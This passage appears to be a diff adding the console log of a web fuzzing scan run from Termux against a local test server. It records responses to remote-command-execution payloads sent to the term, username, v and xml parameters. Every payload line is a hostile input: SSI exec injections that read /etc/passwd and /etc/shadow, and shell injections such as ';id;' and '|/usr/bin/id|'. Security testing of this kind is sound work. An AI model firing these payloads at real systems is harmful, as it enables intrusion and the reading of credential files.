+[1;33m    [HTTP 500 | SIZE 385B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12704B (term=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?term=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ";id;"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12704B (username=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?username=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] /index.html|id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ";id;"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] ;netstat -a;
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12704B | DIFF 0B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12704B | DIFF 0B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12704B | DIFF 0B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 12718B (v=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?v=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+    [HTTP 200 | SIZE 12759B | DIFF 41B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+    [HTTP 200 | SIZE 12759B | DIFF 41B] &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    [HTTP 200 | SIZE 12743B | DIFF 25B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12743B | DIFF 25B] &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    [HTTP 200 | SIZE 12715B | DIFF 3B] /index.html|id|
+    [HTTP 200 | SIZE 12706B | DIFF 12B] ";id;"
+    [HTTP 200 | SIZE 12706B | DIFF 12B] ';id;'
+    [HTTP 200 | SIZE 12704B | DIFF 14B] ;id;
+    [HTTP 200 | SIZE 12703B | DIFF 15B] ;id
+    [HTTP 200 | SIZE 12712B | DIFF 6B] ;netstat -a;
+    [HTTP 200 | SIZE 12706B | DIFF 12B] "|id|"
+    [HTTP 200 | SIZE 12706B | DIFF 12B] '|id|'
+    [HTTP 200 | SIZE 12703B | DIFF 15B] |id
+    [HTTP 200 | SIZE 12712B | DIFF 6B] |/usr/bin/id
+    [HTTP 200 | SIZE 12704B | DIFF 14B] |id|
+    [HTTP 200 | SIZE 12715B | DIFF 3B] "|/usr/bin/id|"
+    [HTTP 200 | SIZE 12715B | DIFF 3B] '|/usr/bin/id|'
+    [HTTP 200 | SIZE 12713B | DIFF 5B] |/usr/bin/id|
+    [HTTP 200 | SIZE 12716B | DIFF 2B] "||/usr/bin/id|"
+    [HTTP 200 | SIZE 12716B | DIFF 2B] '||/usr/bin/id|'
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+[1;35m    [*] Baseline size: 345B (xml=dummy)[0m
+
+[1;36m[+] Fuzzing: http://127.0.0.1:65412?xml=FUZZ [Attack: rce | Max: 20 | Delay: ~1s][0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: /index.html|id|[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ";id;"[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ';id;'[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ;id;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ;id[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: ;netstat -a;[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: "|id|"[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: '|id|'[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |id[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |/usr/bin/id[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |id|[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: "|/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: '|/usr/bin/id|'[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: |/usr/bin/id|[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: "||/usr/bin/id|"[0m
+[1;33m    [HTTP 500 | SIZE 345B] FILE NOT FOUND: '||/usr/bin/id|'[0m
+[1;32m    [✓] Fuzzing done. 20 payload(s) tested.[0m
+
+[1;32m[+] Audit Complete. Log: /data/data/com.termux/files/home/scan_logs/scan_20260401_101543.log[0m
+[1;32m[+] Recon Report: /data/data/com.termux/files/home/scan_logs/report_20260401_101543.json[0m
